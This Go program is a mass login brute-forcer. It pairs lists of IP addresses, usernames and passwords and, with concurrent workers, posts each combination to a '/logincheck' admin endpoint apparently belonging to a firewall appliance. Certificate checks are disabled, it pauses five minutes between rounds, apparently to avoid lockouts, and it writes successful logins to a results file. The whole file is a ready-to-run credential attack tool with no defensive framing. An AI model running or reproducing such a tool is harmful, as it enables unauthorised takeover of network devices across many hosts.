package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 15 * time.Second,
}

var counterMu sync.Mutex
var executionCounter int
var totalLines int

func countTotal(filename string) int {
	file, err := os.Open(filename)
	if err != nil {
		return 0
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() {
		if strings.TrimSpace(scanner.Text()) != "" {
			count++
		}
	}
	return count
}

func generateCombinations(ipFile, userFile, passFile string) {
	ipF, err := os.Open(ipFile)
	if err != nil {
		fmt.Println("Error opening ip file:", err)
		return
	}
	defer ipF.Close()

	userF, err := os.Open(userFile)
	if err != nil {
		fmt.Println("Error opening user file:", err)
		return
	}
	defer userF.Close()

	passF, err := os.Open(passFile)
	if err != nil {
		fmt.Println("Error opening pass file:", err)
		return
	}
	defer passF.Close()

	outF, err := os.Create("input.txt")
	if err != nil {
		fmt.Println("Error creating input.txt:", err)
		return
	}
	defer outF.Close()

	ipScanner := bufio.NewScanner(ipF)
	userScanner := bufio.NewScanner(userF)
	passScanner := bufio.NewScanner(passF)

	for userScanner.Scan() {
		user := strings.TrimSpace(userScanner.Text())
		if user == "" {
			continue
		}
		passF.Seek(0, 0)
		passScanner = bufio.NewScanner(passF)
		for passScanner.Scan() {
			pass := strings.TrimSpace(passScanner.Text())
			if pass == "" {
				continue
			}
			ipF.Seek(0, 0)
			ipScanner = bufio.NewScanner(ipF)
			for ipScanner.Scan() {
				ip := strings.TrimSpace(ipScanner.Text())
				if ip == "" {
					continue
				}
				combo := ip + ";" + user + ";" + pass + "\n"
				outF.WriteString(combo)
			}
		}
	}
}

var mu sync.Mutex

func saveResult(result string) {
	mu.Lock()
	defer mu.Unlock()
	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(result + "\n")
}

type LoginRequest struct {
	User string `json:"user"`
	Pass string `json:"pass"`
}

func test(host, user, pass string, ctx context.Context) bool {
	counterMu.Lock()
	executionCounter++
	shouldSleep := executionCounter >= totalLines
	counterMu.Unlock()

	if shouldSleep {
		time.Sleep(5 * time.Minute)
		counterMu.Lock()
		executionCounter = 0
		counterMu.Unlock()
	}

	fullURL := host + "/logincheck"
	xstr := "ajax=1&username=" + url.QueryEscape(user) + "&secretkey=" + url.QueryEscape(pass) + "&redir=%2Fsystem%2Fdashboard%2F1"
	req, err := http.NewRequestWithContext(ctx, "POST", fullURL, bytes.NewBufferString(xstr))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	bodyStr := string(body)

	if strings.Contains(bodyStr, "/prompt?") {
		return true
	}

	return false
}

func start(filename string, numberOfWorkers int, ctx context.Context) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	jobs := make(chan string)
	var wg sync.WaitGroup

	for i := 0; i < numberOfWorkers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				line, ok := <-jobs
				if !ok {
					return
				}
				parts := strings.Split(line, ";")
				host := parts[0]
				user := parts[1]
				pass := parts[2]
				success := test(host, user, pass, ctx)
				if success {
					saveResult(fmt.Sprintf("Worker %d Success: %s %s %s", id, host, user, pass))
				}
			}
		}(i)
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) == "" {
			continue
		}
		parts := strings.Split(line, ";")
		if len(parts) != 3 {
			fmt.Printf("Invalid line format: %s\n", line)
			continue
		}
		jobs <- line
	}

	close(jobs)
	wg.Wait()

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

}

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("Shutting down gracefully...")
		cancel()
	}()

	// Generate combinations first
	generateCombinations("ip.txt", "user.txt", "password.txt")
	totalLines = countTotal("ip.txt")

	// Call start with a sample filename and workers
	start("input.txt", 10, ctx)
}
